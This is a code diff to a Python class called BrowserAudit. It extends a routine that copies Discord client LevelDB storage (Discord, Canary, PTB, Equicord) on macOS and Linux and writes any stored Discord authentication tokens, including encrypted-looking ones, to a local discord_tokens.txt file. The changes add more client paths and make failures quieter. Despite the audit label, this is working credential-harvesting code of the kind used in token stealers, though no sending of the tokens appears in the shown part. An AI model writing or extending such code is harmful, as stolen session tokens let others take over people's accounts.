@@ -248,21 +248,27 @@ class BrowserAudit:
             discord_dirs = {
                 "Discord": self.home / "Library/Application Support/discord",
                 "Discord Canary": self.home / "Library/Application Support/discordcanary",
+                "Discord PTB": self.home / "Library/Application Support/discordptb",
                 "Equicord": self.home / "Library/Application Support/Equicord"
             }
         else:
             discord_dirs = {
                 "Discord": self.home / ".config/discord",
                 "Discord Canary": self.home / ".config/discordcanary",
+                "Discord PTB": self.home / ".config/discordptb",
                 "Equicord": self.home / ".config/Equicord"
             }
 
         found_any = False
 
         for app_name, discord_dir in discord_dirs.items():
+            if not discord_dir.exists():
+                continue
+
             leveldb_path = discord_dir / "Local Storage/leveldb"
 
             if not leveldb_path.exists():
+                self.log("DEBUG", f"{app_name} LevelDB not found at {leveldb_path}")
                 continue
 
             try:
@@ -271,9 +277,11 @@ class BrowserAudit:
                     shutil.copytree(leveldb_path, temp_db)
 
                     db = plyvel.DB(str(temp_db), create_if_missing=False)
+                    keys_found = []
 
                     for key, value in db.iterator():
                         key_str = key.decode('utf-8', errors='ignore')
+                        keys_found.append(key_str)
 
                         if 'token' in key_str.lower() and 'discord' in key_str.lower():
                             try:
@@ -283,12 +291,19 @@ class BrowserAudit:
                                     with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
                                         f.write(f"[{app_name}] {value_str}\n")
                                     found_any = True
+                                elif len(value_str) > 20:
+                                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
+                                        f.write(f"[{app_name}] (encrypted/obfuscated) {value_str[:50]}...\n")
+                                    found_any = True
                             except:
                                 pass
 
+                    if not keys_found:
+                        self.log("DEBUG", f"{app_name} LevelDB exists but is empty or unreadable")
+
                     db.close()
             except Exception as e:
-                self.log("ERROR", f"Discord extraction failed: {e}")
+                self.log("DEBUG", f"Discord {app_name} extraction: {e}")
 
         if found_any:
             print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
